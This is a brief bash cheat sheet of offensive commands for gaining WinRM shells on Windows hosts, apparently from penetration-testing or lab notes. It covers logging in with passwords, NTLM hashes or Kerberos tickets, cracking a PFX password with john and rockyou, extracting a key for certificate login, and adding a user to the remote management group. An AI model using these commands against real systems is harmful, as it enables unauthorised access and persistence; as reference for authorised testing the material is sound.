```bash
nxc winrm $IP -u [username] -p [password]
evil-winrm -i $IP -u [username] -p [password]
evil-winrm -i $IP -u [username] -H [hash]

KRB5CCNAME=[ticket].ccache
evil-winrm -i [host] -r [domain] -u [user]

# if password protected
pfx2john <pfx file> > pfx.hash
john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Need to convert the pfx file to get both the public cert and the private key
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem
evil-winrm -i 10.129.227.105 -c certificate.pem -k priv-key.pem -S -r <hostname>

# If you have admin rights or SeImpersonatePrivilege, you can enable WinRM
# in an elevated powershell
Enable-PSRemoting -Force 
# add user to remote management users grop
net localgroup "remote management users" $USER /add
```